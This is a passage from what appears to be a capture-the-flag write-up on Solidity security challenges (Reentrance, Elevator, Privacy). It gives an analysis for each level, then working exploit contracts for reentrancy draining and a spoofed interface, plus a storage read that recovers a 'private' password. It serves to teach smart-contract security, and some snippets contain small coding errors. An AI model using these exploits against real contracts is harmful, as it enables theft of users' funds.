<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Analysis</span></p>
<p class="chakra-text css-0" node="[object Object]">A quick read about Re-entrancy attack is all we need: <a class="chakra-link css-9olwc6" href="https://hackernoon.com/hack-solidity-reentrancy-attack">HackerNoon Article</a>.</p>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138011/6b9b88336f13d99f52296f5874086643de346fe2aa6dbd66098162a244b11b6c_ztdmmm.png" alt="Reentrancy method" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Reentrancy method</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">So he is actually our balance after the call that&#x27;s all we need !</p>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Exploitation</span></p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#569CD6">interface</span><span> </span><span class="token" style="color:#4ec9b0">Reentrance</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">donate</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">address _to</span><span class="token" style="color:#d4d4d4">)</span><span> external payable</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">withdraw</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">uint amount</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span><span>contract </span><span class="token" style="color:#4ec9b0">EvilContract</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">8</span><span>    </span><span class="token" style="color:#4ec9b0">Reentrance</span><span> victimContract</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">9</span><span>    address victimAddress</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">10</span><span>    uint donatedValue</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">11</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">12</span><span>    </span><span class="token" style="color:#dcdcaa">constructor</span><span class="token" style="color:#d4d4d4">(</span><span>address _victimAddress</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> payable </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">13</span><span>        </span><span class="token" style="color:#6a9955">// Set our victim contract, fund the contract.</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">14</span><span>        victimContract </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">Reentrance</span><span class="token" style="color:#d4d4d4">(</span><span>_victimAddress</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">15</span><span>        victimAddress</span><span class="token" style="color:#d4d4d4">=</span><span> _victimAddress
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">16</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">17</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">18</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">attack</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">uint _donatedValue</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">19</span><span>        victimContract</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">donate</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">value</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#d4d4d4">{</span><span class="token literal-property" style="color:#9cdcfe">value</span><span class="token" style="color:#d4d4d4">:</span><span>_donatedValue</span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">20</span><span>        victimContract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">withdraw</span><span class="token" style="color:#d4d4d4">(</span><span>_donatedValue</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">21</span><span>        donatedValue</span><span class="token" style="color:#d4d4d4">=</span><span>_donatedValue
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">22</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">23</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">24</span><span>    </span><span class="token" style="color:#569CD6">function</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> payable </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">25</span><span>        </span><span class="token" style="color:#6a9955">// Receiver for funds withdrawn by the attack</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">26</span><span>            </span><span class="token" style="color:#c586c0">if</span><span class="token" style="color:#d4d4d4">(</span><span>victimAddress</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">balance</span><span class="token" style="color:#d4d4d4">&gt;=</span><span> donatedValue </span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">27</span><span>            victimContract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">withdraw</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">value</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">28</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">29</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">30</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">Now we should just do some arithmetic to clear all the funds and not having to donate again and withdraw. If we have 1 ether as initial balance keep it to multipliers of 10 and so on.</p>
<p class="chakra-text css-0" node="[object Object]">Challenge solved ✅</p>
<h2 class="chakra-heading css-1uc67dn" id="elevator">Elevator</h2>
<p class="chakra-text css-0" node="[object Object]"><code class="inline-code">with trust, everyone can get to the last floor</code></p>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Challenge description</span></p>
<p class="chakra-text css-0" node="[object Object]">This elevator won&#x27;t let you reach the top of your building. Right?</p>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Analysis</span></p>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138015/32f18465b7eeaabaeced84613e4e573847463c7b34aefd6d467fdd9d9f04d851_rpolcp.png" alt="Elevator method" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Elevator method</p></div></div><br/>
<!-- -->This function uses the method the msg.sender to know if the floor is accessible or not. The problem here is :</p>
<ol>
<li><code class="inline-code">Elevator</code> contract has no control over the logic of the <code class="inline-code">Building</code> contract.</li>
<li>The <code class="inline-code">goTo</code> function is actually <code class="inline-code">public</code> which makes it possible to have some state changes inside it.</li>
</ol>
<p class="chakra-text css-0" node="[object Object]">And all we need is to make the isLastFloor function returns false at first so we get inside the if block and true to set top.</p>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Exploitation</span></p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#569CD6">interface</span><span> </span><span class="token" style="color:#4ec9b0">Elevator</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span> 
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span> </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">goTo</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">uint _floor</span><span class="token" style="color:#d4d4d4">)</span><span> external</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span><span>contract </span><span class="token" style="color:#4ec9b0">EvilBuilding</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span> 
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span><span>    uint count</span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">;</span><span> 
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">isLastFloor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">uint</span><span class="token" style="color:#d4d4d4">)</span><span> external </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">bool</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span> 
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">8</span><span>        count </span><span class="token" style="color:#d4d4d4">++</span><span> </span><span class="token" style="color:#d4d4d4">;</span><span> 
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">9</span><span>        </span><span class="token" style="color:#c586c0">return</span><span> count</span><span class="token" style="color:#d4d4d4">%</span><span class="token" style="color:#b5cea8">2</span><span class="token" style="color:#d4d4d4">==</span><span class="token" style="color:#b5cea8">0</span><span> </span><span class="token" style="color:#d4d4d4">?</span><span> </span><span class="token" style="color:#569cd6">true</span><span> </span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#569cd6">false</span><span class="token" style="color:#d4d4d4">;</span><span> </span><span class="token" style="color:#6a9955">// The first time will pass false the second true</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">10</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">11</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">12</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">callAttack</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">address </span><span class="token" style="color:#4ec9b0">ElevatorAddress</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">13</span><span>        </span><span class="token" style="color:#4ec9b0">Elevator</span><span> elevatorContract </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">Elevator</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#4ec9b0">ElevatorAddress</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">14</span><span>        elevator</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">goTo</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">10</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span> </span><span class="token" style="color:#6a9955">// put any number here really</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">15</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">16</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">17</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">Challenge solved ✅</p>
<h2 class="chakra-heading css-1uc67dn" id="privacy">Privacy</h2>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Challenge description</span></p>
<p class="chakra-text css-0" node="[object Object]">The creator of this contract was careful enough to protect the sensitive areas of its storage.
Unlock this contract to beat the level.</p>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Analysis</span></p>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138026/ff541ef577bf0b185d9bd2266bc82b7cef5b80e9c30195d89a0ba04fb1f9e21e_sfqspe.png" alt="Privacy storage" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Privacy storage</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">As we said before, every variable in the storage can be accessed all we have to do is find which slot it&#x27;s residing in. Same applies here.</p>
<p class="chakra-text css-0" node="[object Object]">We got the following:</p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#6a9955">// [0] bool locked</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span></span><span class="token" style="color:#6a9955">// [1] uint256 ID</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span></span><span class="token" style="color:#6a9955">// [2]      awkwardness | denomination | flattening</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span></span><span class="token" style="color:#6a9955">// arrays start always in a new slot </span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span><span></span><span class="token" style="color:#6a9955">// [3] bytes32 data[0]</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span><span></span><span class="token" style="color:#6a9955">// [4] bytes32 data[1]</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span><span></span><span class="token" style="color:#6a9955">// [5] bytes32 data[2]</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">8</span>
</span></code></div></pre>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Exploitation</span></p>
<p class="chakra-text css-0" node="[object Object]">We know the position of the password . We can unlock the contract.</p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">getStorageAt</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">INSTANCE_ADDRESS</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#b5cea8">5</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span></span><span class="token" style="color:#6a9955">/// We can manually extract the least significant 16 bytes or simply write a util contract like below</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span>
</span></code></div></pre>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span>contract </span><span class="token" style="color:#4ec9b0">Utils</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span> 
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">get16Bytes</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">bytes32 value</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">bytes16</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span>        </span><span class="token" style="color:#c586c0">return</span><span> </span><span class="token" style="color:#dcdcaa">bytes16</span><span class="token" style="color:#d4d4d4">(</span><span>value</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span>
</span></code></div></pre>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#c586c0">await</span><span> 